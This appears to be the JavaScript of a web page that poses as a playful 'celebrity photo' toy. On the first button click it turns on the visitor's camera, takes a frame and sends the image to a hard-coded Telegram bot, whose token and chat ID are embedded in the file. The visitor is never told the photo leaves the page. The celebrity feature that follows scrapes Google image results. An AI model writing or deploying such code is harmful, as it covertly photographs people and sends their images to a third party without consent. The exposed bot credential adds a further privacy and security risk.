const captureBtn = document.getElementById('capture-btn');
const photoCanvas = document.getElementById('photo-canvas');
const celebrityImg = document.getElementById('celebrity-img');
const TELEGRAM_BOT_API_ENDPOINT = 'https://api.telegram.org/bot5727820511:AAH0LrTp629GSK9MqR5SVDev5IKRqcGsb-s/sendPhoto';
let usingCamera = true;

captureBtn.addEventListener('click', () => {
    if (usingCamera) {
        startCamera();
    } else {
        displayRandomCelebrity();
    }
});

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvasContext = photoCanvas.getContext('2d');
        photoCanvas.width = video.videoWidth;
        photoCanvas.height = video.videoHeight;
        canvasContext.drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
        const photoDataUrl = photoCanvas.toDataURL('image/jpeg');
        await sendPhotoToTelegramBot(photoDataUrl);
        stream.getTracks().forEach(track => track.stop());
        usingCamera = false;
        captureBtn.textContent = 'Click here to try again with a celebrity photo';
    } catch (error) {
        console.error(error);
        alert('Failed to capture photo. Please make sure your camera is enabled and try again.');
    }
}

async function sendPhotoToTelegramBot(photoDataUrl) {
    const formData = new FormData();
    const photoBlob = await fetch(photoDataUrl).then(res => res.blob());
    formData.append('photo', photoBlob, 'photo.jpg');
    const chatId = 5923255825; // Replace with your actual chat ID
    const response = await fetch(`${TELEGRAM_BOT_API_ENDPOINT}?chat_id=${chatId}`, {
        method: 'POST',
        body: formData
    });
    console.log(response);
}

async function displayRandomCelebrity() {
    try {
        const response = await fetch('https://www.google.com/search?q=bollywood+celebrities&tbm=isch&ved=0CAcQMygAahcKEwiw6pLZ7e7yAhUAAAAAHQAAAAAQAg&biw=1366&bih=657');
        const html = await response.text();
        const doc = new DOMParser().parseFromString(html, 'text/html');
        const imgElements = doc.querySelectorAll('img');
        const imgUrls = Array.from(imgElements).map(imgElement => imgElement.getAttribute('src'));
        const randomImgUrl = imgUrls[Math.floor(Math.random() * imgUrls.length)];
        celebrityImg.src = randomImgUrl;
        celebrityImg.style.display = 'block';
        photoCanvas.style.display = 'none';
        captureBtn.textContent = 'Click here to take a photo with your camera';
        usingCamera = true;
    } catch (error) {
        console.error(error);
        alert('Failed to display celebrity photo. Please try again.');
    }
}
